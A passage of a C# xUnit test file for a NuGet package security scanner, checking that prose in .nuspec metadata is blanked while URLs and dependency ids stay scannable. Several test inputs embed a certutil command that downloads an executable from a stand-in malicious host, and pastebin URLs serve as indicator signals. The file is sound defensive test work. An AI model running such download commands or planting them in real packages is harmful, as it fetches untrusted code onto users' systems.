namespace Silvergun.PackageAnalysis.NuGet.Tests;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

using Silvergun;

using Xunit;

/// <summary>
/// Precision tests for nuspec prose redaction (<c>docs/agent/tasks/script-rule-precision.md</c>): code-oriented
/// backdoor/LOLBAS rules must never run over human package metadata, because on prose they are noise by construction
/// (<c>BD000600</c>'s alternation includes bare English words like <c>at</c>/<c>control</c>/<c>update</c>). Two layers
/// are covered here:
/// <list type="bullet">
/// <item><see cref="ScriptRuleScanner.RedactProse"/> — the pure, lexical, length/newline-preserving transform, called
/// directly (no package or zip needed);</item>
/// <item><see cref="ScriptRuleScanner.ScanPackageMetadata"/> — the manifest entry point, driven over real temp
/// <c>.nuspec</c> files on disk.</item>
/// </list>
/// All manifest content is untrusted per the project threat model, so malformed/hostile input must never throw and the
/// non-prose signal (URLs, dependency ids, file targets) must stay byte-identical and fully scannable.
/// </summary>
public sealed class NuspecProseRedactionTests
{
    #region Constructors
    // The scanner logs through the shared Runtime (a NullLogger until initialized); initialize like the other
    // fixture-less test classes so the log calls exercise the real pipeline.
    public NuspecProseRedactionTests() => Runtime.Initialize("Silvergun", "TESTS");
    #endregion

    #region Methods — RedactProse
    // The load-bearing property: prose characters become spaces while the total length and every \r/\n stay exactly
    // where they were, so a StartLine reported against the redacted text is still valid for the real file. CRLF is
    // used explicitly here so both newline characters are covered.
    [Fact]
    public void RedactProse_ProseElement_BlanksContentPreservingLengthAndNewlines()
    {
        var input = string.Join("\r\n",
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
            "<package>",
            "  <metadata>",
            "    <description>certutil -urlcache -f http://malicious.example/n.exe",
            "It word-wraps paragraph text to the control width.</description>",
            "    <projectUrl>https://example.org/project</projectUrl>",
            "  </metadata>",
            "</package>") + "\r\n";

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.DoesNotContain("certutil", result);          // the prose tokens are gone ...
        Assert.DoesNotContain("word-wraps", result);
        Assert.DoesNotContain("control", result);
        Assert.Contains("<description>", result);           // ... but the element structure survives ...
        Assert.Contains("</description>", result);
        Assert.Contains("<projectUrl>https://example.org/project</projectUrl>", result);   // ... and non-prose is intact

        var body = Body(result, "description");
        Assert.NotEqual(0, body.Length);
        Assert.All(body.ToCharArray(), c =>
            Assert.True(c is ' ' or '\r' or '\n', $"redacted body must hold only spaces/newlines; found U+{(int)c:x4}."));
    }

    // Every one of the eight prose elements is redacted — including when the open tag carries attributes and the body
    // spans lines (a real nuspec's <releaseNotes> is a whole multi-line Markdown changelog).
    [Theory]
    [InlineData("description")]
    [InlineData("releaseNotes")]
    [InlineData("summary")]
    [InlineData("title")]
    [InlineData("tags")]
    [InlineData("copyright")]
    [InlineData("authors")]
    [InlineData("owners")]
    public void RedactProse_AllProseElements_AreRedacted(string element)
    {
        var input = string.Join("\n",
            "<package>",
            "  <metadata>",
            $"    <{element} xml:space=\"preserve\">SECRETPROSE first line, certutil -urlcache -f http://x.example/a.exe",
            "     SECRETPROSE second line, clipped at the right edge",
            $"     SECRETPROSE third line</{element}>",
            "  </metadata>",
            "</package>");

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.DoesNotContain("SECRETPROSE", result);
        Assert.DoesNotContain("certutil", result);
        Assert.Contains($"<{element} xml:space=\"preserve\">", result);   // the open tag (attributes included) survives
        Assert.Contains($"</{element}>", result);
    }

    // Everything that is NOT prose is left byte-identical: URLs, dependency ids and file targets are where the genuine
    // nuspec signal lives (pastebin/IOC/URL rules must still see them), so redaction must not touch a single character.
    [Fact]
    public void RedactProse_NonProseElements_LeftByteIdentical()
    {
        var input = string.Join("\n",
            "<package>",
            "  <metadata>",
            "    <id>Benign.Package</id>",
            "    <version>1.2.3</version>",
            "    <projectUrl>https://example.org/project</projectUrl>",
            "    <licenseUrl>https://example.org/license.txt</licenseUrl>",
            "    <iconUrl>https://example.org/icon.png</iconUrl>",
            "    <repository type=\"git\" url=\"https://github.com/owner/repo\" />",
            "    <dependencies>",
            "      <group targetFramework=\"net10.0\">",
            "        <dependency id=\"Newtonsoft.Json\" version=\"13.0.1\" />",
            "      </group>",
            "    </dependencies>",
            "  </metadata>",
            "  <files>",
            "    <file src=\"lib/**/*.dll\" target=\"lib/net10.0\" />",
            "  </files>",
            "</package>");

        Assert.Equal(input, ScriptRuleScanner.RedactProse(input));
    }

    // The <repository commit="..."> value is a fixed-format git hash: no security signal, but 40 hex characters trip
    // BD000804 ("Long Strings") on most real nuspecs, so it is blanked too — for both quote styles and regardless of
    // attribute order. The sibling url value must survive: that IS the genuine <repository> signal.
    [Theory]
    [InlineData("<repository type=\"git\" url=\"https://github.com/owner/repo\" commit=\"0123456789abcdef0123456789abcdef01234567\" />")]
    [InlineData("<repository type='git' url='https://github.com/owner/repo' commit='0123456789abcdef0123456789abcdef01234567' />")]
    [InlineData("<repository commit=\"0123456789abcdef0123456789abcdef01234567\" type=\"git\" url=\"https://github.com/owner/repo\" />")]
    [InlineData("<repository commit='0123456789abcdef0123456789abcdef01234567' url='https://github.com/owner/repo' />")]
    public void RedactProse_RepositoryCommitAttribute_IsBlanked(string repository)
    {
        var input = $"<package>\n  <metadata>\n    {repository}\n  </metadata>\n</package>";

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.DoesNotContain("0123456789abcdef", result);                    // the hash is gone ...
        Assert.Contains("commit=", result);                                   // ... the attribute name is not ...
        Assert.Contains("https://github.com/owner/repo", result);             // ... and the url value stays scannable
    }

    // Scoping guard: the commit blanking is anchored to a <repository> start tag, so a same-named attribute on any
    // other element (or on an element whose name merely ENDS with "repository") is left alone.
    [Theory]
    [InlineData("<metadata commit=\"0123456789abcdef0123456789abcdef01234567\" />")]
    [InlineData("<myrepository commit=\"0123456789abcdef0123456789abcdef01234567\" />")]
    public void RedactProse_CommitOnNonRepositoryElement_NotRedacted(string element)
    {
        var input = $"<package>\n  {element}\n</package>";

        Assert.Equal(input, ScriptRuleScanner.RedactProse(input));
    }

    // A <repository> with no commit attribute is untouched (the common shape), including its url.
    [Fact]
    public void RedactProse_RepositoryWithoutCommit_Unchanged()
    {
        var input = "<package>\n  <metadata>\n    <repository type=\"git\" url=\"https://github.com/owner/repo\" />\n  </metadata>\n</package>";

        Assert.Equal(input, ScriptRuleScanner.RedactProse(input));
    }

    // Hostile/malformed input: an unclosed prose tag matches nothing, so it never throws and the content is left as-is
    // — deliberately favoring recall (the text stays scannable) over silently blanking an unbounded span.
    [Fact]
    public void RedactProse_UnclosedProseTag_DoesNotThrowAndLeavesContent()
    {
        var input = "<package>\n  <description>certutil -urlcache -f http://malicious.example/n.exe\n</package>";

        var result = default(string);
        var ex = Record.Exception(() => result = ScriptRuleScanner.RedactProse(input));

        Assert.Null(ex);
        Assert.Equal(input, result);
        Assert.Contains("certutil", result);   // recall: an unterminated element is still scanned, not blanked away
    }

    // Broader never-throws sweep over degenerate/adversarial manifest fragments: whatever the shape, redaction returns
    // a string of the same length with the same newline layout (the invariant line numbers depend on).
    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("<description>")]
    [InlineData("</description>")]
    [InlineData("<description><description>nested</description>")]
    [InlineData("<description>a</description ></description>")]
    [InlineData("<DESCRIPTION>upper</DESCRIPTION>")]
    [InlineData("<repository commit=\"unterminated")]
    [InlineData("<repository commit='mixed\" url=\"https://example.org\">")]
    [InlineData("<description\n\r\n>split tag</description>")]
    [InlineData("<tags>a</tags><tags>b</tags>\r\n<title>c</title>")]
    [InlineData("<nu:>x</nu:>")]              // degenerate prefix: the local name is empty, which matches no element
    [InlineData("</:description>")]           // a closing tag with an empty prefix and no start tag anywhere
    public void RedactProse_MalformedOrHostileInput_NeverThrowsAndPreservesLengthAndNewlines(string input)
    {
        var result = default(string);
        var ex = Record.Exception(() => result = ScriptRuleScanner.RedactProse(input));

        Assert.Null(ex);
        AssertLengthAndNewlinesPreserved(input, result!);
    }
    #endregion

    #region Methods — RedactProse anti-degeneracy guard
    // THE regression guard for the hand-rolled linear scan, and specifically for its memoized `unclosed` bitmask.
    // Redaction must be O(n) on hostile-but-under-cap input: the index advances monotonically and a prose element
    // whose closing tag is absent is remembered as absent, so repeated unclosed start tags never re-search the tail.
    //
    // DO NOT "simplify" the bitmask away, and do not go back to a regex. Measured numbers:
    //   * this scan:      ~119 ms / ~73 ms / ~110 ms for the three shapes below (Debug test build; ~15-23 ms
    //                     optimized), and ~25 ms for the 4 MB tag-free input in the next test;
    //   * a naive "search forward for </name> on every start tag" rewrite:   88 SECONDS on the first shape;
    //   * the original pair of regexes:   timed out at its 2 s match cap — and a timeout made the scanner SKIP the
    //     file, i.e. a package could suppress its own metadata findings simply by shipping this nuspec.
    // The 5 s bound is therefore ~40x headroom over the current cost while still failing hard on either regression;
    // it is deliberately loose so a slow or loaded CI agent cannot flake it.
    [Theory]
    [InlineData("<description>", 300_000)]      // never closed: one failed </description> search, then memoized
    [InlineData("<repository ", 300_000)]       // no '>' anywhere: one scan to EOF inside the first start tag
    [InlineData("<tags>a</tags>", 200_000)]     // the opposite extreme: every start tag matches immediately
    [InlineData("<!--", 300_000)]               // comment-heavy: one failed "-->" search from the first '<', then stop
                                                //                (measured ~2 ms — see SkipNonElement)
    [InlineData("<nu:description>", 300_000)]   // the prefixed form of the first shape: matched on its LOCAL name, so it
                                                // must memoize the absent closing tag exactly like the bare form
    [InlineData("<a:description><description>", 150_000)]
    // ^ THE memo-soundness-vs-speed guard for prefixed documents (measured ~105 ms). FindCloseTag scans for the bare
    // local name and accepts any prefix before it, so "no closing tag from here on" is a fact about the ELEMENT, not
    // about one spelling of it — one bit per element stays sound however the tags alternate. A memo keyed more
    // conservatively (e.g. per prefix, or dropped entirely for qualified names because the fact "looked" prefix-specific)
    // would re-search the whole 4 MB tail for every one of the 300_000 start tags here and go quadratic.
    public void RedactProse_DegenerateUnclosedTags_CompletesQuickly(string fragment, int repeats)
    {
        var input = string.Concat(Enumerable.Repeat(fragment, repeats));

        var watch = Stopwatch.StartNew();
        var result = ScriptRuleScanner.RedactProse(input);
        watch.Stop();

        Assert.True(watch.Elapsed < degenerateBudget,
            $"redaction of {repeats}x \"{fragment}\" took {watch.Elapsed.TotalSeconds:F1}s, over the "
            + $"{degenerateBudget.TotalSeconds:F0}s budget — the linear-scan/memoization guarantee has regressed.");
        AssertLengthAndNewlinesPreserved(input, result);
    }

    // Same budget for the ordinary shape of a big manifest — a large body of plain text with no tags at all must be
    // returned byte-identical (nothing to redact) rather than scanned quadratically.
    [Fact]
    public void RedactProse_TagFreeLargeInput_ReturnedByteIdenticalAndQuickly()
    {
        var input = string.Join("\n", Enumerable.Repeat(new string('a', 4095), 1024));   // ~4 MB, no '<' anywhere

        var watch = Stopwatch.StartNew();
        var result = ScriptRuleScanner.RedactProse(input);
        watch.Stop();

        Assert.True(watch.Elapsed < degenerateBudget,
            $"redaction of {input.Length} tag-free characters took {watch.Elapsed.TotalSeconds:F1}s.");
        Assert.Equal(input, result);
    }
    #endregion

    #region Methods — RedactProse lexical edge cases
    // A self-closing prose element has no body, so nothing may be blanked: the earlier bug shape here is treating the
    // tag as opened and blanking everything up to the next "</tags" — which would swallow the non-prose elements in
    // between. The <projectUrl> after it must survive byte-identical, while a REAL prose element further down is still
    // redacted (proving the scan continued past the self-closing tag rather than bailing out).
    [Theory]
    [InlineData("<tags />")]
    [InlineData("<tags attr=\"x\"/>")]
    [InlineData("<tags/>")]
    public void RedactProse_SelfClosingProseElement_DoesNotBlankRestOfDocument(string selfClosing)
    {
        var input = string.Join("\n",
            "<package>",
            "  <metadata>",
            $"    {selfClosing}",
            "    <projectUrl>https://pastebin.com/raw/aBcD1234</projectUrl>",
            "    <tags>SECRETPROSE at control update</tags>",
            "  </metadata>",
            "</package>");

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.Contains(selfClosing, result);                                                    // the tag itself ...
        Assert.Contains("<projectUrl>https://pastebin.com/raw/aBcD1234</projectUrl>", result);   // ... and what follows
        Assert.DoesNotContain("SECRETPROSE", result);                                            // real prose still goes
    }

    // A '>' inside a quoted attribute value must not be mistaken for the end of the start tag: only the element's body
    // is blanked, the attribute value itself stays as written, and the following element is untouched.
    [Fact]
    public void RedactProse_GreaterThanInsideQuotedAttributeValue_OnlyBodyBlanked()
    {
        var input = string.Join("\n",
            "<package>",
            "  <tags a=\">\">SECRETPROSE</tags>",
            "  <projectUrl>https://example.org/project</projectUrl>",
            "</package>");

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.DoesNotContain("SECRETPROSE", result);
        Assert.Contains("<tags a=\">\">", result);
        Assert.Contains("<projectUrl>https://example.org/project</projectUrl>", result);
    }

    // Only an EXACT `commit` attribute is blanked: a name that merely starts or ends with it is a different attribute
    // and stays scannable (the scan matches whole XML names, not substrings).
    [Theory]
    [InlineData("<repository type=\"git\" commitish=\"0123456789abcdef0123456789abcdef01234567\" />")]
    [InlineData("<repository type=\"git\" precommit=\"0123456789abcdef0123456789abcdef01234567\" />")]
    [InlineData("<repository type=\"git\" commit-id=\"0123456789abcdef0123456789abcdef01234567\" />")]
    public void RedactProse_CommitAttributeNameBoundaries_NotBlanked(string repository)
    {
        var input = $"<package>\n  <metadata>\n    {repository}\n  </metadata>\n</package>";

        Assert.Equal(input, ScriptRuleScanner.RedactProse(input));
    }

    // XML allows whitespace around '=', so the value is still found and blanked when the attribute is spelled out.
    [Fact]
    public void RedactProse_CommitWithWhitespaceAroundEquals_IsBlanked()
    {
        var input = "<package>\n  <repository commit = \"0123456789abcdef0123456789abcdef01234567\" url=\"https://github.com/owner/repo\" />\n</package>";

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.DoesNotContain("0123456789abcdef", result);
        Assert.Contains("commit = \"", result);
        Assert.Contains("https://github.com/owner/repo", result);   // the sibling url signal survives
    }

    // An unquoted attribute value is not well-formed XML, so redaction leaves it alone — but it must NOT abort the rest
    // of the tag: the sibling url (the genuine <repository> signal) has to come out intact and scannable.
    [Fact]
    public void RedactProse_UnquotedCommitValue_LeftIntactAndScanContinues()
    {
        var input = "<package>\n  <repository commit=0123456789abcdef url=\"https://pastebin.com/raw/aBcD1234\" />\n  <tags>SECRETPROSE</tags>\n</package>";

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.Contains("commit=0123456789abcdef", result);                          // nothing blanked here ...
        Assert.Contains("url=\"https://pastebin.com/raw/aBcD1234\"", result);        // ... the url is still scannable ...
        Assert.DoesNotContain("SECRETPROSE", result);                                // ... and the scan did not abort
    }

    // Prose element names are matched whole: an element whose name merely contains a prose name is not prose.
    [Theory]
    [InlineData("descriptionx")]
    [InlineData("mytags")]
    [InlineData("titles")]
    [InlineData("xauthors")]
    public void RedactProse_ProseElementNameBoundaries_NotBlanked(string element)
    {
        var input = $"<package>\n  <{element}>certutil -urlcache -f http://x.example/a.exe</{element}>\n</package>";

        Assert.Equal(input, ScriptRuleScanner.RedactProse(input));
    }

    // Comments, processing instructions and CDATA carry no prose element of their own, so redaction passes them through
    // byte-identically — including when a prose element NAME appears inside them (that text is not element content, and
    // blanking it would silently drop scannable material). Recorded as observed-and-intended behavior.
    [Theory]
    [InlineData("<!-- <description>certutil -urlcache -f http://x.example/a.exe</description> -->")]
    [InlineData("<!-- tags: at control update reg sc te -->")]
    [InlineData("<?xml version=\"1.0\" encoding=\"utf-8\"?>")]
    [InlineData("<?xml-stylesheet type=\"text/xsl\" href=\"nuspec.xsl\"?>")]
    [InlineData("<![CDATA[ <tags>at control update</tags> ]]>")]
    [InlineData("<![CDATA[ certutil -urlcache -f http://x.example/a.exe ]]>")]
    public void RedactProse_CommentsProcessingInstructionsAndCData_LeftByteIdentical(string fragment)
    {
        var input = $"<package>\n  <metadata>\n    {fragment}\n  </metadata>\n</package>";

        Assert.Equal(input, ScriptRuleScanner.RedactProse(input));
    }

    // The flip side of the test above, and the documented asymmetry: a prose body is redacted as RAW CHARACTERS with no
    // markup exemptions, so a comment sitting INSIDE one is blanked along with it (intended — a comment in a changelog
    // is prose, and exempting it would need markup semantics this deliberately-lexical pass does not have). A comment
    // outside any prose body is still passed through byte-identically. Pins the doc clarification as behavior.
    [Fact]
    public void RedactProse_CommentInsideProseBody_IsBlankedWithBody()
    {
        const string outside = "<!-- outside any prose body: at control update -->";
        const string inside = "<!-- inside the changelog: at control update -->";
        var body = $"{EarlierProse} {inside} {LaterProse}";
        var input = string.Join("\n",
            "<package>",
            "  <metadata>",
            $"    {outside}",
            $"    <releaseNotes>{body}</releaseNotes>",
            $"    <projectUrl>{ProjectUrl}</projectUrl>",
            "  </metadata>",
            "</package>");

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.Contains(outside, result);                                       // outside: byte-identical ...
        Assert.Contains($"<projectUrl>{ProjectUrl}</projectUrl>", result);
        Assert.DoesNotContain(inside, result);                                  // ... inside: gone with the body ...
        Assert.Contains($"<releaseNotes>{new string(' ', body.Length)}</releaseNotes>", result);   // ... blanked whole
    }
    #endregion

    #region Methods — RedactProse namespace-qualified element names
    // THE regression guard for matching elements on their LOCAL name (everything after the last ':').
    //
    // The bug: only unqualified names were recognized, so <nu:description> was not redacted. A package MAY qualify its
    // metadata and still be perfectly valid and installable — NuGet's own NuspecReader resolves metadata elements by
    // local name — so such a manifest had its prose scanned raw, silently reintroducing the BD000600 bare-word false
    // positives (at/control/update) this feature exists to eliminate. Pre-fix every case below came back ENTIRELY
    // unredacted, so this test fails if the LocalName call in RedactProse is removed. Do not relax it.
    [Theory]
    [InlineData("description")]
    [InlineData("releaseNotes")]
    [InlineData("summary")]
    [InlineData("title")]
    [InlineData("tags")]
    [InlineData("copyright")]
    [InlineData("authors")]
    [InlineData("owners")]
    public void RedactProse_PrefixedProseElement_IsRedacted(string element)
    {
        var body = $"SECRETPROSE {LaterProse}";
        var input = string.Join("\n",
            "<nu:package xmlns:nu=\"http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd\">",
            "  <nu:metadata>",
            $"    <nu:{element}>{body}</nu:{element}>",
            $"    <nu:projectUrl>{ProjectUrl}</nu:projectUrl>",
            "  </nu:metadata>",
            "</nu:package>");

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.DoesNotContain("SECRETPROSE", result);
        Assert.DoesNotContain(LaterProse, result);
        // Both tags byte-identical, body blanked to exactly its own width.
        Assert.Contains($"<nu:{element}>{new string(' ', body.Length)}</nu:{element}>", result);
        Assert.Contains($"<nu:projectUrl>{ProjectUrl}</nu:projectUrl>", result);   // non-prose still untouched
    }

    // The attribute half of the same fix: <nu:repository> is a <repository> too, so its fixed-format commit hash is
    // blanked (BD000804 "Long Strings"), while the sibling url — the genuine repository signal the pastebin/IOC/URL
    // rules must see — stays byte-identical.
    [Fact]
    public void RedactProse_PrefixedRepositoryCommit_IsBlankedAndUrlSurvives()
    {
        const string url = "https://pastebin.com/raw/x";
        var input = string.Join("\n",
            "<nu:package xmlns:nu=\"http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd\">",
            $"  <nu:repository commit=\"0123456789abcdef0123456789abcdef01234567\" url=\"{url}\" />",
            "</nu:package>");

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.DoesNotContain("0123456789abcdef", result);      // the hash is gone ...
        Assert.Contains("commit=\"", result);                   // ... the attribute name is not ...
        Assert.Contains($"url=\"{url}\"", result);              // ... and the url value is byte-identical
    }

    // The negative boundaries still hold once prefixes are in play: a PREFIX is what sits BEFORE a ':', so
    // "descriptionx"/"mytags" have no colon at all and must still not match — matching on the local name must not
    // degrade into a substring match. (Its unprefixed twin, RedactProse_ProseElementNameBoundaries_NotBlanked, stays
    // green for the same reason.) The degenerate "<nu:>" — an empty local name — matches nothing and is left alone.
    [Theory]
    [InlineData("<nu:descriptionx>certutil -urlcache -f http://x.example/a.exe</nu:descriptionx>")]
    [InlineData("<nu:mytags>at control update</nu:mytags>")]
    [InlineData("<myrepository commit=\"0123456789abcdef0123456789abcdef01234567\">x</myrepository>")]
    [InlineData("<nu:>at control update</nu:>")]
    public void RedactProse_PrefixedNameBoundaries_NotBlanked(string fragment)
    {
        var input = $"<package>\n  <metadata>\n    {fragment}\n  </metadata>\n</package>";

        Assert.Equal(input, ScriptRuleScanner.RedactProse(input));
    }

    // Start and closing tag need not agree on the prefix (nothing in the pass pairs them up): the body ends at the
    // first closing tag for the element's local name whatever prefix it carries, or none. Prefixes and names are both
    // matched case-insensitively, so <NU:tags> … </Nu:TAGS> is redacted too.
    [Theory]
    [InlineData("<description>", "</nu:description>")]
    [InlineData("<nu:description>", "</description>")]
    [InlineData("<NU:tags>", "</Nu:TAGS>")]
    public void RedactProse_MixedPrefixedAndUnprefixedTags_StillRedacts(string open, string close)
    {
        var input = string.Join("\n",
            "<package>",
            $"  {open}{LaterProse}{close}",
            $"  <projectUrl>{ProjectUrl}</projectUrl>",
            "</package>");

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.DoesNotContain(LaterProse, result);
        Assert.Contains($"{open}{new string(' ', LaterProse.Length)}{close}", result);
        Assert.Contains($"<projectUrl>{ProjectUrl}</projectUrl>", result);
    }
    #endregion

    #region Methods — RedactProse non-element constructs (comment/CDATA/PI/DOCTYPE)
    // THE regression guard for the fix that made comments/CDATA/PIs/declarations skipped wholesale to their own
    // terminator *before* any attribute or quote logic runs (ScriptRuleScanner.SkipNonElement).
    //
    // The bug: a comment was classified as an ordinary start tag, so the lone apostrophe in a perfectly normal
    // "<!-- don't blank -->" was read as the opening quote of an attribute value. No closing quote existed, so the
    // whole pass aborted at that point and EVERY prose element after the comment came back unredacted — silently
    // reintroducing the BD000600 bare-word false positives (at/control/update) this feature exists to eliminate.
    // Pre-fix, both inputs below came back entirely unredacted, so this test fails if the SkipNonElement call in
    // RedactProse is removed. Do not relax it.
    [Theory]
    [InlineData("<!-- don't blank -->", "at control update")]
    [InlineData("<!-- don't blank <tags>after apostrophe</tags> -->", "later at control")]
    public void RedactProse_UnpairedQuoteInComment_DoesNotDisableLaterRedaction(string comment, string prose)
    {
        var input = string.Join("\n",
            "<package>",
            "  <metadata>",
            $"    {comment}",
            $"    <tags>{prose}</tags>",
            $"    <projectUrl>{ProjectUrl}</projectUrl>",
            "  </metadata>",
            "</package>");

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.Contains(comment, result);                                       // the comment is byte-identical ...
        Assert.Contains($"<projectUrl>{ProjectUrl}</projectUrl>", result);     // ... so is the non-prose signal ...
        Assert.DoesNotContain(prose, result);                                   // ... and redaction still happened after it
        Assert.Contains($"<tags>{new string(' ', prose.Length)}</tags>", result);
    }

    // The same guard for the other three non-element constructs: an unpaired apostrophe inside a CDATA section, a
    // processing instruction or a DOCTYPE declaration must not be mistaken for an attribute quote either — each is
    // skipped to its own terminator (]]>, ?>, >) and the prose that follows is still blanked.
    [Theory]
    [InlineData("<![CDATA[ don't ]]>")]
    [InlineData("<? don't ?>")]
    [InlineData("<!DOCTYPE don't >")]
    public void RedactProse_UnpairedQuoteInCdataOrPiOrDoctype_DoesNotDisableLaterRedaction(string construct)
    {
        var input = string.Join("\n",
            "<package>",
            "  <metadata>",
            $"    {construct}",
            $"    <tags>{LaterProse}</tags>",
            $"    <projectUrl>{ProjectUrl}</projectUrl>",
            "  </metadata>",
            "</package>");

        var result = ScriptRuleScanner.RedactProse(input);

        AssertLengthAndNewlinesPreserved(input, result);
        Assert.Contains(construct, result);                                     // byte-identical, apostrophe included
        Assert.Contains($"<projectUrl>{ProjectUrl}</projectUrl>", result);
        Assert.DoesNotContain(LaterProse, result);
        Assert.Contains($"<tags>{new string(' ', LaterProse.Length)}</tags>", result);
    }

    // A non-element construct whose terminator never occurs (truncated or hostile) is the deliberate safe-stop case:
    // the pass keeps everything it has redacted so far and stops, so the text from the construct onward comes back
    // byte-identical — under-redaction, which can only cost precision, never a missed detection. The prose BEFORE the
    // construct must still be blanked, which is what keeps this test non-vacuous.
    [Theory]
    [InlineData("<!-- unterminated <tags>x</tags>")]
    [InlineData("<![CDATA[ unterminated cdata section")]
    [InlineData("<? unterminated processing instruction")]
    [InlineData("<!DOCTYPE unterminated declaration")]
    public void RedactProse_NonElementConstructMissingTerminator_NeverThrowsAndPreservesLength(string construct)
    {
        var input = string.Join("\n",
            $"<tags>{EarlierProse}</tags>",
            construct,
            $"<tags>{LaterProse}</tags>");
        var tail = input.IndexOf(construct, StringComparison.Ordinal);

        var result = default(string);
        var ex = Record.Exception(() => result = ScriptRuleScanner.RedactProse(input));

        Assert.Null(ex);
        AssertLengthAndNewlinesPreserved(input, result!);
        Assert.DoesNotContain(EarlierProse, result);                            // the pass was working up to here ...
        Assert.Equal(input[tail..], result![tail..]);                           // ... and stopped dead at the construct
    }

    // The degenerate comment openers. "<!-->" and "<!--->" have no "-->" at all, so their terminator is absent and the
    // pass safe-stops (nothing after them is redacted, nothing is blanked); the well-formed "<!---->" and "<!--x-->" are
    // skipped whole and the prose after them is still blanked. No shape blanks content a reader would expect to
    // survive — the only failure mode here is leaving text unredacted, which costs precision, not recall.
    [Theory]
    [InlineData("<!-->", false)]
    [InlineData("<!--->", false)]
    [InlineData("<!---->", true)]
    [InlineData("<!--x-->", true)]
    public void RedactProse_CommentEdgeShapes_HandledWithoutThrowing(string comment, bool laterProseBlanked)
    {
        var input = string.Join("\n",
            "<package>",
            $"  {comment}",
            $"  <tags>{LaterProse}</tags>",
            $"  <projectUrl>{ProjectUrl}</projectUrl>",
            "</package>");

        var result = default(string);
        var ex = Record.Exception(() => result = ScriptRuleScanner.RedactProse(input));

        Assert.Null(ex);
        AssertLengthAndNewlinesPreserved(input, result!);
        Assert.Contains(comment, result);                                       // the comment itself is never rewritten
        Assert.Contains($"<projectUrl>{ProjectUrl}</projectUrl>", result);
        if (laterProseBlanked)
        {
            Assert.DoesNotContain(LaterProse, result);
            Assert.Contains($"<tags>{new string(' ', LaterProse.Length)}</tags>", result);
        }
        else
            Assert.Equal(input, result);                                        // safe stop: the document is untouched
    }

    // A DOCTYPE with an internal subset. KNOWN, DELIBERATE LIMITATION (recorded, not pinned): the <!…> skip ends at the
    // FIRST '>' with no quote or internal-subset awareness, so a '>' inside the subset ("x>y") ends the skip early and
    // the remainder of the declaration is rescanned as ordinary content. That is safe by construction — it can only
    // under-redact (leave declaration text scannable), never miss a detection or blank real signal — so the assertions
    // below cover only what the contract promises: no throw, length/newlines preserved, and the prose that follows is
    // still blanked (i.e. the pass does not abort part-way through the declaration).
    [Fact]
    public void RedactProse_DoctypeWithInternalSubset_StillRedactsFollowingProse()
    {
        const string doctype = "<!DOCTYPE foo [ <!ENTITY e \"x>y\"> ]>";
        var input = string.Join("\n",
            doctype,
            "<package>",
            $"  <tags>{LaterProse}</tags>",
            $"  <projectUrl>{ProjectUrl}</projectUrl>",
            "</package>");

        var result = default(string);
        var ex = Record.Exception(() => result = ScriptRuleScanner.RedactProse(input));

        Assert.Null(ex);
        AssertLengthAndNewlinesPreserved(input, result!);
        Assert.Contains(doctype, result);
        Assert.Contains($"<projectUrl>{ProjectUrl}</projectUrl>", result);
        Assert.DoesNotContain(LaterProse, result);
        Assert.Contains($"<tags>{new string(' ', LaterProse.Length)}</tags>", result);
    }
    #endregion

    #region Methods — ScanPackageMetadata
    // THE headline regression guard (measured evidence: Jumbee.Console.Snapshot 0.1.5 produced 11 findings, all from
    // its nuspec prose). A manifest whose <description>/<releaseNotes>/<tags>/... carry the bare English words in
    // BD000600's LOLBAS alternation (control, at, update, reg, sc, te) must yield ZERO findings. The first assertion
    // keeps the test honest: scanned WITHOUT redaction, the very same file DOES trip the rules.
    [Fact]
    public void ScanPackageMetadata_NuspecProseWithLolbasWords_YieldsNoFindings()
    {
        using var dir = new TempDir();
        var path = dir.WriteFile(ProseNuspecName, ProseNuspec());
        var scanner = new ScriptRuleScanner();

        Assert.NotEmpty(scanner.ScanFile(path, ProseNuspecName));   // not vacuous: unredacted, this prose is a false positive

        Assert.Empty(scanner.ScanPackageMetadata(path, ProseNuspecName));
    }

    // The other half of the measured evidence: a 40-hex <repository commit> is a fixed-format hash that trips
    // BD000804 ("Long Strings") on most real nuspecs. With its value blanked the manifest scans clean, while the
    // repository url beside it stays scannable (asserted at the redaction level above).
    [Fact]
    public void ScanPackageMetadata_RepositoryCommitSha_YieldsNoLongStringFinding()
    {
        using var dir = new TempDir();
        const string name = "Commit.Package.nuspec";
        var path = dir.WriteFile(name, string.Join("\n",
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
            "<package>",
            "  <metadata>",
            "    <id>Commit.Package</id>",
            "    <version>1.0.0</version>",
            "    <description>A benign package.</description>",
            "    <repository type=\"git\" url=\"https://github.com/owner/repo\" commit=\"0123456789abcdef0123456789abcdef01234567\" />",
            "  </metadata>",
            "</package>"));
        var scanner = new ScriptRuleScanner();

        Assert.NotEmpty(scanner.ScanFile(path, name));   // not vacuous: unredacted, the commit hash is a false positive

        Assert.Empty(scanner.ScanPackageMetadata(path, name));
    }

    // Recall is preserved where it matters: a rule-matching token in a NON-prose element (here a pastebin URL in
    // <projectUrl>, the kind of signal a manifest really does carry) is still flagged, pinned to the supplied
    // package-relative path and tagged PackageMetadata so the CLI reports it without gating --strict.
    [Fact]
